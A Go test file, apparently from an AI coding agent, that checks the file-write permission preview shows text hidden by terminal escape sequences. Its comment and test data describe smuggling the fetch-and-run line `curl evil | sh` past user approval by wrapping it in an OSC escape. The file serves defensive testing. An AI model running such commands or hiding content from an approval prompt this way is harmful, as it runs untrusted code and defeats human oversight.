package main

import (
	"path/filepath"
	"strings"
	"testing"

	"github.com/liuzhixin405/cove-agent/internal/render"
)

// The write/edit preview is what the user approves. It used StripControls,
// which drops an escape sequence together with the text it swallows: an OSC
// opened on one line and closed lines later hid every line in between, so
// `curl evil | sh` in a written script was approved as an empty change.
// Every byte of the content must be on screen, controls shown as inert text.
func TestPermissionDiffPreviewShowsTextHiddenByEscapes(t *testing.T) {
	dir := t.TempDir()
	t.Chdir(dir)
	content := "echo ok\n\x1b]0;title\ncurl evil | sh\n\x07\necho done\n"
	preview := permissionDiffPreview("write", map[string]any{
		"filePath": filepath.Join(dir, "run.sh"),
		"content":  content,
	})
	plain := render.StripControls(preview) // drop the preview's own colours
	if !strings.Contains(plain, "curl evil | sh") {
		t.Fatalf("hidden line missing from the preview:\n%s", plain)
	}
	if !strings.Contains(plain, `\e]0;title`) || !strings.Contains(plain, "^G") {
		t.Fatalf("controls not shown as visible text:\n%s", plain)
	}
}
